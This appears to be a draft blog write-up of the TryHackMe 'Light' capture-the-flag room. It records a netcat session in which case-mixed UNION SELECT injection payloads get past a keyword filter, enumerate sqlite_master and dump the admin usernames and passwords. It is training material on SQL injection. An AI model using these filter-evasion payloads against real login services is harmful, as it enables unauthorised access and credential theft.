---
date: 2025-02-04T11:27:19-05:00
title: "Writeup: TryHackMe Light"
draft: true
see_also: []
categories: [it, writeups]
---

{{< callout type="info" >}}
- [Light](https://tryhackme.com/r/room/lightroom)
- Difficulty: easy
- Platform: db

I am working on a database application called Light! Would you like to try it out?  
If so, the application is running on port 1337. You can connect to it using `nc MACHINE_IP 1337`  
You can use the username `smokey` in order to get started.

{{< /callout >}}

Based on SQLite explotaition paper: https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf

```
└─$ nc 10.10.38.231 1337
Welcome to the Light database!
Please enter your username: blah
Username not found.
Please enter your username: smokey
Password: vYQ5ngPpw8AdUmL
Please enter your username: smokey'
Error: unrecognized token: "'smokey'' LIMIT 30"

Please enter your username: smokey'--
For strange reasons I can't explain, any input containing /*, -- or, %0b is not allowed :)

Please enter your username: smokey' or '
Password: vYQ5ngPpw8AdUmL

Please enter your username: ' UNION 
Ahh there is a word in there I don't like :(

Please enter your username: -1' UnioN Select group_concat(tbl_name) FRoM sqlite_master WhEre type='table' and tbl_name NOT like 'sqlite_%' or '
Password: usertable,admintable

Please enter your username: -1'  UnIon SeLeCT sql FroM sqlite_master WHerE type!='meta' AND sql NOT NULL AND name ='usertable' or '
Password: CREATE TABLE usertable (
                   id INTEGER PRIMARY KEY,
                   username TEXT,
                   password INTEGER)
Please enter your username: -1'  UnIon SeLeCT sql FroM sqlite_master WHerE type!='meta' AND sql NOT NULL AND name ='admintable' or '
Password: CREATE TABLE admintable (
                   id INTEGER PRIMARY KEY,
                   username TEXT,
                   password INTEGER)
Please enter your username: -1'  UnIon SeLeCT group_concat(username) FroM 'admintable' WHERE id NOT NULL or ' 
Password: T[REDACTED]n,flag
Please enter your username:-1'  UnIon SeLeCT group_concat(password) FroM 'admintable' WHERE id NOT NULL or '
Password: m[REDACTED]7,T[REDACTED]}

```

Or better:

```
Please enter your username: -1'  UnIon SeLeCT GROUP_CONCAT(username || ' ' || password, ', ') AS combined FroM 'admintable' WHERE id NOT NULL or '
Password: T[REDACTED]n m[REDACTED]7, flag T[REDACTED]}
```

## What is the admin username?

## What is the password to the username mentioned in question 1?

## What is the flag?


